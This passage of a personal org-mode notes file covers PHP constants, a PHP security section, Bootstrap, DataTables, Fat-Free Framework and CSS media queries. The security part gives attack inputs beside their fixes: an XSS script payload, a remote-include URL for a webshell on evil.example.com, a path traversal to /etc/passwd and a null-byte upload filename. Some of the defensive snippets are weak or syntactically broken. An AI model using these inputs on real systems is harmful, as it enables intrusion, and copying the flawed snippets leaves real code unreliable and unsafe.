// Get the name of the current trait. Only returns a value when used inside a trait or object declaration.
echo "Current trait is " . __TRAIT__;

#+end_src

** File & Directory Constants
*** Current file

You can get the name of the current PHP file (with the absolute path) using the
__FILE__ magic constant. This is most often used as a logging/debugging
technique.
#+begin_src php 
echo "We are in the file:" , __FILE__ , "\n";
#+end_src 

*** Current directory

To get the absolute path to the directory where the current file is located use the __DIR__ magic constant.
#+begin_src php 
echo "Our script is located in the:" , __DIR__ , "\n";
#+end_src 

To get the absolute path to the directory where the current file is located, use dirname(__FILE__).

#+begin_src php 
echo "Our script is located in the:" , dirname(__FILE__) , "\n";
#+end_src 

Getting current directory is often used by PHP frameworks to set a base directory:
#+begin_src php 
// index.php of the framework
define(BASEDIR, __DIR__); // using magic constant to define normal constant
// somefile.php looks for views:

$view = 'page';
$viewFile = BASEDIR . '/views/' . $view;
#+end_src 

*** Separators

Windows system perfectly understands the / in paths so the DIRECTORY_SEPARATOR is used mainly when parsing paths.
Besides magic constants PHP also adds some fixed constants for working with paths:

 - ~DIRECTORY_SEPARATOR~ constant for separating directories in a path. Takes
   value / on *nix, and \ on Windows. The example with views can be rewritten with:
#+begin_src php 
$view = 'page';
$viewFile = BASEDIR . DIRECTORY_SEPARATOR .'views' . DIRECTORY_SEPARATOR . $view;
#+end_src 

 - Rarely used ~PATH_SEPARATOR~ constant for separating paths in the $PATH
   environment variable. It is ; on Windows, : otherwise

** Difference between __FUNCTION__ and __METHOD__
__FUNCTION__ returns only the name of the function whereas __METHOD__ returns
the name of the class along with the name of the function:
#+begin_src php
<?php

class trick
{
    public function doit()
    {
        echo __FUNCTION__;
    }

    public function doitagain()
    {
        echo __METHOD__;
    }
}

$obj = new trick();
$obj->doit(); // Outputs: doit
$obj->doitagain();  // Outputs: trick::doitagain
#+end_src 

** Difference between __CLASS__, get_class() and get_called_class()
__CLASS__ magic constant returns the same result as get_class() function called
without parameters and they both return the name of the class where it was
defined (i.e. where you wrote the function call/constant name ).

In contrast, get_class($this) and get_called_class() functions call, will both
return the name of the actual class which was instantiated:

#+begin_src php
<?php

class Definition_Class {

  public function say(){
     echo '__CLASS__ value: ' . __CLASS__ . "\n";
     echo 'get_called_class() value: ' . get_called_class() . "\n";
     echo 'get_class($this) value: ' . get_class($this) . "\n";
     echo 'get_class() value: ' . get_class() . "\n";
  }
  
}

class Actual_Class extends Definition_Class {}

$c = new Actual_Class();
$c->say();
// Output:
// __CLASS__ value: Definition_Class
// get_called_class() value: Actual_Class
// get_class($this) value: Actual_Class
// get_class() value: Definition_Class
#+end_src 

* security
** Cross-site scripting
*** intro   
For cross-site scripting—commonly abbreviated as XSS—the attack vector targets
an area where a user-supplied variable is included in application output, but not
properly escaped. This allows an attacker to inject a client-side script of their choice
as part of that variable’s value.
Here’s an example of code vulnerable to this type of attack:

#+begin_src html
<form action=”<?php echo $_SERVER['PHP_SELF']; ?>”>
<input type=”submit” value=”Submit” />
</form>
#+end_src 

*fix*
Compared to the attack itself, the fix is surprisingly simple: escape output from PHP
code to prevent the attacker from being able to inject their code in the first place.
This looks like the following:

#+begin_src html
<form action=”<?php echo htmlentities($_SERVER['PHP_SELF']); ?>”>
  <input type=”submit” value=”Submit” />
</form>
#+end_src 

*** How To Avoid $_SERVER["PHP_SELF"] Exploits?
~$_SERVER["PHP_SELF"]~ exploits can be avoided by using the ~htmlspecialchars()~
function.

The form code should look like this:
#+begin_src php
<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
#+end_src 

The ~htmlspecialchars()~ function converts special characters to HTML entities.
Now if the user tries to exploit the PHP_SELF variable, it will result in the
following output:

#+begin_src 
<form method="post" action="test_form.php/&quot;&gt;&lt;script&gt;alert('hacked')&lt;/script&gt;">
#+end_src 

The exploit attempt fails, and no harm is done!
** Cross-site Request Forgery(CSRF)
*** intro   
a Cross-site Request Forgery, often abbreviated to CSRF.
The purpose of this type of attack is to have a victim send an HTTP request to a
specific website, taking advantage of the victim’s established identity with that
website.

*fix*
 - Don't use GET for creation,modification or deletion.

the specification for the HTTP protocol, which states the following:"the
convention has been established that the GET and HEAD methods SHOULD NOT have
the significance of taking an action other than retrieval."

 - use CSRF token

This change(use of POST method) doesn’t preclude the possibility that an
attacker might duplicate this HTML on another website. When a victim submits the
form, the request will include their session cookie for the domain in the form
action.

To address this, you can take advantage that a normal user will view the
form before submitting it by including a field with a random value, known as a
nonce or CSRF token. The token will also be stored in the user’s session, and
compared to the form value when the form is submitted to confirm that the values
are identical. The modified script to output the form looks as follows:

#+begin_src php
<?php
session_start();
if ($_POST && $_POST['token'] == $_SESSION['token']) {
  // process form submission
} else {
  $token = uniqid(rand(), true);
  $_SESSION['token'] = $token;
?>
<form method=”post” action=”http://example.com/oneclickpurchase.php”>
<input type=”hidden” name=”token” value=”<?php echo $token; ?>” />
<input type=”hidden” name=”product_id” value=”12345” />
<input type=”submit” value=”1-Click Purchase” />
</form>
<?php
}
#+end_src 

*** example #1
Add a hidden form field with a one-time token, and store this token in the user’s session:

#+begin_src php

<?php
session_start();
$_SESSION['token'] = md5(uniqid(mt_rand(), true));
?>

<form action="buy.php" method="POST">
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>" />
<p>Stock Symbol: <input type="text" name="symbol" /></p>
<p>Quantity: <input type="text" name="quantity" /></p>
<p><input type="submit" value="Buy Stocks" /></p>
</form>
#+end_src 

When you receive a request that represents a form submission, check the tokens to be sure they match:

#+begin_src php

<?php

session_start();

if ($_POST['token'] != $_SESSION['token'] ||
    !isset($_SESSION['token'])) {
    /* Prompt user for password. */
} else {
    /* Continue. */
}

?>
#+end_src

** PHP version lookup
By default, PHP will tell the world what version of PHP you are using, e.g.
#+begin_src 
X-Powered-By: PHP/5.3.8
#+end_src 

To fix this you can either change ~php.ini~:
#+begin_src 
expose_php = off
#+end_src 

Or change the header:
#+begin_src php 
header("X-Powered-By: Magic");
#+end_src 

Or if you'd prefer a htaccess method:
#+begin_src 
Header unset X-Powered-By
#+end_src 

If either of the above methods do not work, there is also the header_remove()
function that provides you the ability to remove the header;
#+begin_src php 
header_remove('X-Powered-By');
#+end_src 

If attackers know that you are using PHP and the version of PHP that you are
using, it's easier for them to exploit your server.

** disabling error reporting
It is good practice to avoid displaying potential error messages which will
reveal information about your system, like for example your directory tree.
Solution
Turn them off before making your website visible to the outside world.
#+begin_src 
ini_set("display_errors", "0");
#+end_src 
Or change them directly in the php.ini.
#+begin_src 
display_errors = 0
#+end_src 

** Remote File Inclusion

Remote File Inclusion (also known as RFI) is a type of vulnerability that allows
an attacker to include a remote file.

This example injects a remotely hosted file containing a malicious code:
#+begin_src php 
<?php
include $_GET['page'];
/vulnerable.php?page=http://evil.example.com/webshell.txt?
#+end_src 

*Local File Inclusion*

Local File Inclusion (also known as LFI) is the process of including files on a
server through the web browser.
#+begin_src php 
<?php
$page = 'pages/'.$_GET['page'];
if(isset($page)) {
    include $page;
} else {
    include 'index.php';
}
/vulnerable.php?page=../../../../etc/passwd
#+end_src 

*Solution to RFI & LFI:*

It is recommended to only allow including files you approved, and limit to those only.
#+begin_src php 
<?php
$page = 'pages/'.$_GET['page'].'.php';
$allowed = ['pages/home.php','pages/error.php'];
if(in_array($page,$allowed)) {
    include($page);
} else {
    include('index.php');
}
#+end_src 

** Stripping Tags
~strip_tags~ is a very powerful function if you know how to use it. However some
people are oblivious of its full usage.

*Basic Example*
#+begin_src php 
$string = '<b>Hello,<> please remove the <> tags.</b>';

echo strip_tags($string);
#+end_src 
Raw Output
#+begin_src 
Hello, please remove the tags.
Allowing Tags
#+end_src 

Say you wanted to allow a certain tag but no other tags, then you'd specify that
in the second parameter of the function. This parameter is optional. In my case
I only want the <b> tag to be passed through.
#+begin_src php 
$string = '<b>Hello,<> please remove the <br> tags.</b>';

echo strip_tags($string, '<b>');
#+end_src 

*Raw Output* 
#+begin_src 
<b>Hello, please remove the  tags.</b>
#+end_src 

*Notice(s)*

HTML comments and PHP tags are also stripped. This is hardcoded and can not be
changed with allowable_tags.

In PHP 5.3.4 and later, self-closing XHTML tags are ignored and only
non-self-closing tags should be used in allowable_tags. For example, to allow
both <br> and <br/>, you should use:
#+begin_src php 
<?php
strip_tags($input, '<br>');
?>
#+end_src 

** Uploading files
If you want users to upload files to your server you need to do a couple of
security checks before you actually move the uploaded file to your web
directory.

*The uploaded data:*

This array contains user submitted data and is not information about the file
itself. While usually this data is generated by the browser one can easily make
a post request to the same form using software.
#+begin_src 
$_FILES['file']['name'];
$_FILES['file']['type'];
$_FILES['file']['size'];
$_FILES['file']['tmp_name'];
#+end_src 

 - name - Verify every aspect of it.
 - type - Never use this data. It can be fetched by using PHP functions instead.
 - size - Safe to use.
 - tmp_name - Safe to use.

*Exploiting the file name*

Normally the operating system does not allow specific characters in a file name,
but by spoofing the request you can add them allowing for unexpected things to
happen. For example, lets name the file:
#+begin_src 
../script.php%00.png
#+end_src 
Take good look at that filename and you should notice a couple of things.

 1 The first to notice is the ../, fully illegal in a file name and at the same
 time perfectly fine if you are moving a file from 1 directory to another, which
 we're gonna do right?

 2 Now you might thing you were verifying the file extensions properly in your
script but this exploit rely's on the url decoding, translating %00 to a null
character, basically saying to the operating system, this string ends here,
stripping off .png off the filename. So now I've uploaded script.php to another
directory, by-passing simple validations to file extensions. It also by-passes
.htaccess files disallowing scripts to be executed from within your upload
directory.

Getting the file name and extension safely

You can use pathinfo() to extrapolate the name and extension in a safe manner
but first we need to replace unwanted characters in the file name:
#+begin_src php
// This array contains a list of characters not allowed in a filename
$illegal   = array_merge(array_map('chr', range(0,31)), ["<", ">", ":", '"', "/", "\\", "|", "?", "*", " "]);
$filename  = str_replace($illegal, "-", $_FILES['file']['name']);

$pathinfo  = pathinfo($filename);
$extension = $pathinfo['extension'] ? $pathinfo['extension']:'';
$filename  = $pathinfo['filename'] ? $pathinfo['filename']:'';

if(!empty($extension) && !empty($filename)){
  echo $filename, $extension;
} else {
  die('file is missing an extension or name');
}
#+end_src 

While now we have a filename and extension that can be used for storing, I still
prefer storing that information in a database and give that file a generated
name of for example, md5(uniqid().microtime())
#+begin_src 
+----+--------+-----------+------------+------+----------------------------------+---------------------+
| id | title  | extension | mime       | size | filename                         | time                |
+----+--------+-----------+------------+------+----------------------------------+---------------------+
| 1  | myfile | txt       | text/plain | 1020 | 5bcdaeddbfbd2810fa1b6f3118804d66 | 2017-03-11 00:38:54 |
+----+--------+-----------+------------+------+----------------------------------+---------------------+
#+end_src 

This would resolve the issue of duplicate file names and unforseen exploits in
the file name. It would also cause the attacker to guess where that file has
been stored as he or she cannot specifically target it for execution.

*Mime-type validation*

Checking a file extension to determine what file it is is not enough as a file
may named image.png but may very well contain a php script. By checking the
mime-type of the uploaded file against a file extension you can verify if the
file contains what its name is referring to.

You can even go 1 step further for validating images, and that is actually opening them:
#+begin_src php 
if($mime == 'image/jpeg' && $extension == 'jpeg' || $extension == 'jpg'){
  if($img = imagecreatefromjpeg($filename)){
    imagedestroy($img);
  } else {
    die('image failed to open, could be corrupt or the file contains something else.');
  }
}
#+end_src 

You can fetch the mime-type using a build-in function or a class.

*White listing your uploads*

Most importantly, you should whitelist file extensions and mime types depending on each form.
#+begin_src php 
$whitelist = [
  'extensions' => [
    'png', 'gif', 'jpg', 'jpeg'
  ],
  'mimes' => [
    'image/png',
    'image/gif',
    'image/jpeg',
  ]
];

if(in_array($extension, $whitelist['extensions'])){
  if(in_array(mime_content_type($filename), $whitelist['mimes']){
    // safe to store.
  } else {
    die('file extension does not match mime');
  }
} else {
  die("Only '" . join(', ', $whitelist['extensions'])) . "' extensions are allowed");
}
#+end_src 

** disable =register_globals=
** preventing session hijacking

When SSL is not a possibility, you can further authenticate users by storing
their IP address along with their other details. Do this by adding a line such
as the following when you store a user’s session:

#+begin_src php
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
#+end_src 

Then, as an extra check, whenever any page loads and a session is available,
perform the following check. It calls the function different_user if the stored
IP address doesn’t match the current one:

#+begin_src php
if ($_SESSION['ip'] != $_SERVER['REMOTE_ADDR']) different_user();
#+end_src 

Of course, you need to be aware that users on the same proxy server, or sharing
the same IP address on a home or business network, will have the same IP
address. Again, if this is a problem for you, use SSL. You can also store a copy
of the browser’s user agent string (a string that developers put in their
browsers to identify them by type and version), which, due to the wide variety
of browser types, versions, and computer platforms, might help to distinguish
users. Use the following to store the user agent:

#+begin_src php
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];
#+end_src 

And use this to compare the current agent string with the saved one:

#+begin_src php
if ($_SESSION['ua'] != $_SERVER['HTTP_USER_AGENT']) different_user();
#+end_src 

Or, better still, combine the two checks like this and save the combination as an md5 hexadecimal string:

#+begin_src php
$_SESSION['check'] = md5($_SERVER['REMOTE_ADDR'] .
    $_SERVER['HTTP_USER_AGENT']);
#+end_src 

* apache =.htaccess= sample configuration
  
#+begin_src
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-l
RewriteRule .* index.php [L,QSA]
#+end_src

The script tells Apache that whenever an HTTP request arrives and if
no physical file (!-f) or path (!-d) or symbolic link (!-l) can be
found, it should transfer control to index.php

* turn off DNS prefetching from individual documents

You can also turn off DNS Prefetching from individual documents, using the
http-equiv attribute on the <meta> element, like this:

#+begin_src html
<meta http-equiv="x-dns-prefetch-control" content="off">
 <!-- turns on dns prefetching -->
<meta http-equiv="x-dns-prefetch-control" content="off">
<!-- force the lookup of specific hostnames -->
<link rel="dns-prefetch" href="http://www.spreadfirefox.com/">
#+end_src 

* disable caching for a website

#+begin_src html
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
#+end_src 

http://live.datatables.net/sadipaji/132/edit
* disable ajax browser caching
#+begin_src javascript
//prevents browser caching
$.ajaxSetup({ cache: false });
#+end_src

* csv
** Use PHP's fputcsv without writing to a file
PHP's fputcsv function is very useful for creating CSV files, but by default
will write out to a file. There are a couple of tricks to be able to keep it all
in memory or instead write the CSV data out directly to the web browser without
having to write your own custom functions.

*Array to CSV function using fputcsv*

This function takes an array and returns the correctly formatted CSV data as a
string using an in-memory buffer. It takes the same parameters as the fputcsv
function, passing them through to it, so it can be used in the same way as
fputcsv.
#+begin_src php
function array2csv($fields, $delimiter = ",", $enclosure = '"', $escape_char = "\\")
{
    $buffer = fopen('php://temp', 'r+');
    fputcsv($buffer, $fields, $delimiter, $enclosure, $escape_char);
    rewind($buffer);
    $csv = fgets($buffer);
    fclose($buffer);
    return $csv;
}
#+end_src 
Note that you can substitute php://temp for php://memory. The only difference
between the two is that php://memory will always store its data in memory,
whereas php://temp will use a temporary file once the amount of data stored hits
a predefined limit (the default is 2 MB).

Here's an example:
#+begin_src php
echo array2csv(array('apples', 'bananas', 'oranges', 'pears'));
//And the output:
//apples,bananas,oranges,pears
#+end_src 

*Writing the array straight out to the browser*
Instead of buffering the CSV data in memory, you can write it directly out to the data by using php://output instead of php://temp or php://memory:
#+begin_src php 
function array2csv($array)
{
    $output = fopen('php://output', 'w');
    fputcsv($output, $array);
    fclose($output);
}
#+end_src 

* query
  
#+BEGIN_SRC sql :engine postgresql  :cmdline -p 5432 -h 127.0.0.1 -U postgres -d test2
SELECT s,md5 from huge_data_table limit 10;
#+END_SRC 

#+RESULTS:

#+name: my-query
#+header: :engine postgresql
#+header: :dbhost 127.0.0.1
#+header: :dbuser postgres
#+header: :dbpassword jjj
#+header: :database test2
#+begin_src sql
SELECT s,md5 FROM huge_data_table limit 10;
#+end_src

#+RESULTS: my-query

* error handler

#+begin_src php
 <?php
    ini_set('error_reporting', E_ALL | E_STRICT);
    ini_set('display_errors', 'Off');
    ini_set('log_errors', 'On');
    ini_set('error_log', '/usr/local/apache/logs/error_log');
  ?>
  
// PHP also allows you to handle your own errors with the set_error_handler( ) function: 
    <?php
    set_error_handler('my_error_handler');
    ?>

// This allows you to define your own function (my_error_handler( )) to handle errors; the following is an example implementation: 
    <?php
    function my_error_handler($number, $string, $file, $line, $context)
    {
      $error = "=  ==  ==  ==  ==\nPHP ERROR\n=  ==  ==  ==  ==\n";
      $error .= "Number: [$number]\n";
      $error .= "String: [$string]\n";
      $error .= "File:   [$file]\n";
      $error .= "Line:   [$line]\n";
      $error .= "Context:\n" . print_r($context, TRUE) . "\n\n";
      error_log($error, 3, '/usr/local/apache/logs/error_log');
    }
?>
// This restricts errors to warnings.
<?php
    set_error_handler('my_warning_handler', E_WARNING);
 ?>
#+end_src 

* bootstrap
** structure of page
*** settings of the viewing arena

#+begin_src html
<meta name="viewport"
      content="width=device-width, initial-scale=1" />
#+end_src

The zoom behavior can be turned off with no user-scalable=no.

*** Container
    
Bootstrap utilizes a container element to initiate the page and find a
basis for the grid.
*Containers can be used multiple times on the page, but should not be nested.*


#+begin_src html
<div class="container">
     ...
</div>
#+end_src

Alternatively, the class .container-fluid can be used, which always
uses the full width of the device:

#+begin_src html
1   <div class="container-fluid">
2     ...
3   </div>
#+end_src

*** Device Specific Definitions
    
#+begin_src
“xs” <= 544 px
“sm” <= 768 px
“md” <= 992 px
“lg” <= 1200 px
“xl” > 1200 px
1   @media (min-width: @screen-sm-min) { ... }
2
3   @media (min-width: @screen-md-min) { ... }
4
5   @media (min-width: @screen-lg-min) { ... }
#+end_src

*** Order Column

If individual columns have class styles such as .push-md- or pull-md-, they can be used,
even if different from their natural order. “Push” means pushing columns to the right,
while they are pulled to the left with “pull”.

#+begin_src html
1   <div class="row">
2     <div class="col-md-9 push-md-3">9 + 3 right</div>
3     <div class="col-md-3 pull-md-9">3 + 9 left</div>
4   </div>
#+end_src

** typography
*** Orientation
    
The alignment of text is up to your creative nature.

- text-left: Left aligned
- text-center: Text is centered
- text-right: Right aligned
- text-justify: Justified
- text-nowrap: Obstruction of upheaval

In addition, there are alignment variants that are only valid for certain viewports.

- text-xs-left: Left aligned when the viewport “xs” is used.
- text-xs-center: Text is centered when the viewport “xs” is used.
- text-xs-right: Right aligned when the viewport “xs” is used.
  
*** transformation
    
Transformations convert text from lowercase to uppercase and vice versa.

 - text-lowercase: Converts to lowercase
 - text-uppercase: Converts to uppercase
 - text-capitalize: First letter of each word is capitalized.
 - text-weight-bold: Bold without an explicit tag.
 - text-weight-normal: Normal weight without an explicit tag
 - text-italics: Italics without an explicit tag

*** lists
**** =.list-unstyled=

If the default style used and there are icons not needed, they can be removed by the
class =.list-unstyled=.
This will affect only the immediate members not the deeper nesting
levels.

** form 
** show/hide bootstrap modals 
Bootstrap has a few functions that can be called manually on modals:

#+begin_src javascript
$('#myModal').modal('toggle');
$('#myModal').modal('show');
$('#myModal').modal('hide');
#+end_src 

** change =table-stripped= strip color

#+begin_src html
    /* for bootstrap table-striped strip color*/
    .table-striped>tbody>tr:nth-child(odd)>td,
    .table-striped>tbody>tr:nth-child(odd)>th {
        background-color: #B6E9DF;  /* choose your color here */
    }
#+end_src 

** disable modal outside popup close

#+begin_src html
 <div class="modal fade"  role="dialog" data-backdrop="static" data-keyboard="false">
#+end_src 

** customize modal style

add an extra class to the modal like ~<div class="modal custom">~ then you can
style it like ~.modal.custom~.

#+begin_src html
<div class="modal custom fade" id="myModal2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
  
.modal.custom .modal-dialog {
    width:50%;
    margin:0 auto;
    /*add what you want here*/
}

#+end_src 

http://jsfiddle.net/surjithctly/ka8uW/

** Bootsterap table without stripes/borders
#+begin_src html

.borderless table {
    border-top-style: none;
    border-left-style: none;
    border-right-style: none;
    border-bottom-style: none;
}
#+end_src

** password show on text

#+begin_src html
<script src="https://use.fontawesome.com/fd9dba5260.js"></script>
<script>
$(document).ready(function(){
    $("#password_show_button").mouseup(function(){
        $("#password_show").attr("type", "password");
    });
    $("#password_show_button").mousedown(function(){
        $("#password_show").attr("type", "text");
    });
});
</script>

<div class="input-group" style="width: 49%;">
<input value="This my password" id="password_show" type="password" class="form-control">
<span style="width:0%" id="password_show_button" class="input-group-addon"><i class="fa fa-eye-slash" aria-hidden="true"></i></span>
</div>
#+end_src 

** useful resources

http://www.tutorialrepublic.com/twitter-bootstrap-tutorial

* =datatables=
** filter for text inside a =<span>= or other html

#+begin_src javascript
  {column_number: 4, filter_reset_button_text: false, filter_default_label: '', column_data_type:'html', html_data_type:'text', filter_match_mode:'exact'},
#+end_src

** make hidden column details visible in responsive mode

#+begin_src javascript 
var table = $('#datatable-packages').DataTable({
 //...
 {
              details:{
                  display: $.fn.dataTable.Responsive.display.childRowImmediate,
                  type: ''
              }
            },
//..
}]
#+end_src

** responsive table
#+begin_src javascript
    var holdedtable =$("#holded-packages").DataTable({
        "responsive": true,
        "searching":false,
        "ordering": false,
        "bInfo" : false,
        "paging" : false,
        "language": {
            "zeroRecords": "هیچ رکوردی یافت نشد."
        }
    });
//
    holdedtable.responsive.recalc();
#+end_src

* HTML
** How do you disable browser Autocomplete on web form field / input tag?

autocomplete prevents form data from being cached in older browsers.

#+begin_src html
<input type="text" name="foo" autocomplete="off" />
#+end_src 

** How to use the “required” attribute with a “radio” input field

You just need to set the required-attribute for one input of the radiogroup, but you can set it for all.

For example:

#+begin_src html
<form>
  <label for="input1">1:</label>
  <input type="radio" name="myradiogroup1" id="input1" value="1" required><br>

  <label for="input2">2:</label>
  <input type="radio" name="myradiogroup1" id="input2" value="2"><br>

  <label for="input3">3:</label>
  <input type="radio" name="myradiogroup1" id="input3" value="3"><br>

  <input type="submit" value="send">
</form>
#+end_src 

** HTML5 form required attribute. Set custom validation message?

http://jsfiddle.net/nteb4/23/

** disable input box =autocomplete=
   
#+begin_src html
<input type="text"  id="codetxt" autocomplete="off"/>
#+end_src

** How to disable the mobile keyboard from displaying input field

To block the mobile device keyboard from displaying you simply need to set the
field to readonly with jQuery as displayed in the code below.

#+begin_src html
$('#input_92_31').attr('readonly','readonly');
#+end_src

** web application mobile icons

#+begin_src html
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<link rel="apple-touch-startup-image" href="startup.png">
<link rel="apple-touch-icon" href="youricon.png"/>
<link rel="apple-touch-icon-precomposed" sizes="128x128" href="youricon.png">

<meta name="mobile-web-app-capable" content="yes">
<link rel="shortcut icon" sizes="196x196" href="youriconhighres.png">
<link rel="shortcut icon" sizes="128x128" href="youricon.png">
#+end_src 

** useful resources 
https://html.spec.whatwg.org/multipage/index.html
https://xhr.spec.whatwg.org/ 
https://codepen.io/patterns/
* FatFreeFramework
** CSRF protection example

#+begin_src php

$f3->route('GET /',
    function($f3) {
        $f3->set('IP',$f3->get('IP'));
        $f3->set('AGENT',$f3->get('AGENT'));
        $rand= mt_rand(79, 7900);
        $f3->set('csrf',$rand);
        $f3->set('SESSION.csrf',$rand);    
        echo \Template::instance()->render('login.html');
    }
,0,64);

///
if ($f3->get('POST.csrf') == $f3->get('SESSION.csrf')) {
balalalala
}
#+end_src

** Installing Fat-Free Framework (with Composer)

#+begin_src php
 {
  "name": "avenirer/myapp",
  "description": "F3 app",
  "require": {
    "bcosca/fatfree": "^3.5"
  },
  "authors": [
    {
      "name": "Avenirer",
      "email": "avenir.ro@gmail.com"
    }
  ]
}
#+end_src

** moving logic to controllers

#+begin_src php
require_once "vendor/autoload.php";

$app = Base::instance();

class Homepage {
  function index(){
    echo 'hello from index';
  }
}


$app->route('GET /','Homepage->index');

$app->run();
#+end_src

** setting autoload folder

#+begin_src php
$f3->set('AUTOLOAD','App/Controllers/');
AUTOLOAD=app/controllers/|app/models/
#+end_src

** managing redirects in route config file

Now, assuming we had an old page (and we couldn’t simply route the contactus url
to that controller…), we put the following at the bottom of our routes.cfg:

#+begin_src
[routes]
 
GET /=Homepage->index
GET /contact=Contact->index
 
[redirects]
 
GET|HEAD /contactus=/contact
#+end_src 

** accessing route parameters

#+begin_src 
# in routes.cfg
GET /contact/@who=Contact->index
#+end_src 

#+begin_src php

<?php
 
class Contact {
 
  function index(){
    $f3 = Base::instance();
    echo $f3->get('PARAMS.who');
    echo '<br />';
    echo 'hello from contact controller';
  }
}
#+end_src

** accessing all url segments

use =PARAMS.0=
#+begin_src
# in App/Config/routes.cfg
GET /contact/@who/*=Contact->index
#+end_src 

#+begin_src php

<?php

class Contact{
	function index(){
	  $f3= Base::instance();
	  echo $f3->get("PARAMS.0");
	}
}
#+end_src

** Defining and using named routes

#+begin_src 
GET @the_contact_page: /contact=Contact->index
#+end_src 

Now, in the views you can use it by calling the *alias()* method

#+begin_src php
<a href="<?php echo $f3->alias('the_contact_page');?>The contact page</a>
#+end_src 

If you need to pass one parameter to the named url (assuming the route is
defined like this: ~GET @the_contact_page:/contact/@who/=Contact->index )~, you
write:

#+begin_src php
<a href="<?php echo $f3->alias('the_contact_page, 'who=avenirer');?>The contact page</a>
#+end_src 

in template files use

#+begin_src php
<a href="{{'the_contact_page' | alias}}"?>The contact page</a>
<a href="{{'the_contact_page','who=avenirer,how=byemail' | alias }}">The contact page</a>
#+end_src

** Organising controllers in subfolders, routes and namespacing

#+begin_src php
// App/Controllers/Users/Test.php
<?php
namespace Users;
 
class Test {
 
  public function index()
  {
    echo 'hello';
  }
}
#+end_src 

#+begin_src
# App/Config/routes.cfg
GET /testingusers=Users\Test->index
#+end_src 

* css
** media query
*** basic syntax
You can use media queries in three ways, all of which match
the different ways that CSS can be applied to a document.

<link href="file" rel="stylesheet" media="logic media and (expression)">

The second is to call an external style sheet using the @import directive:

@import url('file') logic media and (expression);

The third is to use media queries in an embedded style element or in
the style sheet itself with the extended @media rule:

@media logic media and (expression) { rules }

writing rules that will apply to all media types

@media all and (expression) { rules }
@media (expression) { rules }

*** logic
The first new attribute for the @media rule is logic . This optional key-
word can have the value of either only or not:

@media only media and (expression) { rules }
@media not media and (expression) { rules }

The only value is mainly useful if you want to hide the rule from older
browsers that don’t support the syntax; for browsers that do support it, only
is effectively ignored. The not value is used to negate the query; you use not
to apply the styles if the parameters you set are not met.

*** feature

Media features are information about the device that’s being used to display
the web page: its dimensions, resolution, and so on.

@media (feature: value) { rules }
@media (feature) { rules }

*** width and height

@media (width: 600px) { rules }
the rules are applied only to browsers that are set to be
exactly 600px wide

@media (max-width: 480px) { rules }
@media (min-width: 640px) { rules }

The first query applies the rules in browsers that are no wider than
480px, and the second in browsers that are at least 640px wide.

*** Pixel ratio
In general, the CSS pixel unit (px) is a measurement of a single pixel on the
computer screen.
The ratio of physical pixels to CSS pixels is known as the device pixel ratio (DPR).

**** resolution media feature
@media media and (resolution: value) { rules }

The value of resolution is a number with a unit of resolution: dots per
inch (DPI), dots per centimeter (DPCM), or, most pertinently to us, dots per pixel
(DPPX). The DPPX unit maps to the DPR of the device, so to apply a rule to
devices that have a DPR value of 1.5, you use this:

@media (resolution: 1.5dppx) { rules }

As with the other media features, you can also detect maximum and
minimum pixel ratios:

@media (max-resolution: number) { rules }
@media (min-resolution: number) { rules }
*** device width and height

The width and height media features are related to the dimensions of the
browser viewport, but that viewport isn’t always as big as the screen it’s
displayed on. If you need to target the physical screen size rather than the
viewport size, you can use the *device-width* and *device-height* properties and
their related min- and max- variants.

<meta name="viewport" content="width=device-width">

When the viewport meta tag with these values is present in the head of a
page, mobile browsers go into “mobile mode,” in which the viewport is sized
to ideal dimensions for that device.

*** orientation

If you’re less concerned with the actual dimensions of the viewing device
but want to optimize your pages for either horizontal (like a typical desk-
top/laptop web browser) or vertical (like a mobile phone or ebook reader)
viewing, the media feature you need is orientation . Here is its syntax:

@media (orientation: value) { rules }

value can be one of two keyword options: landscape or portrait . The
landscape value applies when the width of your browser is greater than its
height, and the portrait value applies when the opposite is true.

*example*

ul { overflow: hidden; }
li { float: left; }
@media (orientation: portrait) {
    li { float: none; }
}

*** aspect ratio
You can also create queries that apply when a certain width-to-height ratio is
met. Use aspect-ratio to test the browser’s aspect ratio or device-aspect-ratio
to test the device’s aspect ratio. Here is the syntax for these two features:

@media (aspect-ratio: horizontal/vertical) { rules }
@media (device-aspect-ratio: horizontal/vertical) { rules }

The horizontal and vertical values are positive integers that represent
the ratio of the width and height (respectively) of the viewing device’s screen,
so a square display would be 1/1 and a cinematic widescreen display would
be 16/9.

*** Multiple Media Features

You can chain multiple queries together on the same media type by adding
expressions with the and operator:

@media logic media and (expression) and (expression) { rules }

For example, to test for a narrow screen on a device with an
aspect ratio no greater than 15/10, you use this query:

@media (max-device-aspect-ratio: 15/10) and (max-width: 800px) {...}

You can also use a conditional “or” expression by adding extra queries
in a comma-separated list:

@media logic media and (expression), logic media and (expression) { rules }

** selectors
*** Attribute selectors
#+begin_src css
E[attr] {...} /* Simple Attribute Selector */
E[attr='value'] {...} /* Exact Attribute Value Selector */
E[attr  ~='value'] {...} /* Partial Attribute Value Selector */
E[attr|='value'] {...} /* Language Attribute Selector */
#+end_src 

The Simple Attribute Selector applies rules to elements that have the
s ­ pecified attribute defined, regardless of that attribute’s value.
#+begin_src css
a[rel] { color: red; }
#+end_src 

If you want to be more specific, you can use the Exact Attribute Value Selector
to define a value:
#+begin_src css
a[rel='friend'] { color: red; }
#+end_src 

This code applies the rule only to the second a element in the
markup (v) because it selects only elements that have the exact value
of  friend . If you want to select both of the elements that have this value,
you would use the Partial Attribute Value Selector:
#+begin_src css
a[rel~='friend'] { color: red; }
#+end_src 

This code looks for the value of friend as part of a space-separated list
(in most cases, a word)

The final selector, the Language Attribute Selector, applies rules to ele-
ments that have an attribute matching the first argument in the selector,
the value of which is the second argument in the selector followed immedi-
ately by a hyphen.
#+begin_src css 
a[lang|='es'] { color: red; }
#+end_src 

*** New Attribute Selectors in CSS3
Beginning Substring Attribute Value Selector

